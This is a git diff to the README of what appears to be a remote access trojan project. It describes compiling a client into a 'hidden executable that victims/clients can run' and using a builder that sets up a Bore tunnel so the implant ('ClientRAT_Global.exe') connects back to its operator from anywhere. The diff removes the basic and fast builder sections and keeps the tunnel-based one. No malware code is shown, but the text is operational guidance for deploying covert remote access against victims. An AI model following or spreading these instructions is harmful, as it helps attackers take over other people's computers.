@@ -141,18 +141,11 @@ pip install -r requirements.txt
 ### 🛠️ Building the Client Executable (.exe / Linux Binary)
 
 You can compile the `client.py` into a standalone, hidden executable that victims/clients can run without needing Python installed.
-*Note: If you run these build scripts on Windows, they generate a `.exe`. If you run them on Linux, they generate a native Linux executable.*
+*Note: If you run the build script on Windows, it generates a `.exe`. If you run it on Linux, it generates a native Linux executable.*
 
-#### 1️⃣ Basic Local Builder
-Use this if you are testing locally or already have your own port forwarding setup.
-```bash
-python build_client.py
-```
-*(Creates a standard `.exe` configured with whatever IP/Port is hardcoded in `client.py`)*
+Don't want to mess with router port forwarding or Ngrok? Use the advanced auto-builder!
+It automatically sets up a free **Bore** tunnel and compiles your client into a standalone executable that works anywhere on the internet.
 
-#### 2️⃣ Global Access Auto-Builder (Recommended for WAN)
-Don't want to mess with router port forwarding or Ngrok? Use the advanced builder!
-It automatically sets up a free **Bore** tunnel and compiles your client into a standalone `.exe` that works anywhere on the internet.
 ```bash
 python advanced_build.py
 ```
@@ -161,13 +154,7 @@ python advanced_build.py
 - Safely injects the public IP and Port to compile `ClientRAT_Global.exe`
 - Your original `client.py` stays safely configured for localhost!
 
-#### 3️⃣ Fast Builder (For Dev Testing)
-Use this if you are constantly testing and need a quick `.exe` compiled without extra obfuscation.
-```bash
-python fast_build.py
-```
-
-> **🎯 IMPORTANT:** Once the build process finishes successfully, your final `.exe` file will be located inside the **`dist`** folder within your project directory!
+> **🎯 IMPORTANT:** Once the build process finishes successfully, your final executable file will be located inside the **`dist`** folder within your project directory!
 
 ---
 
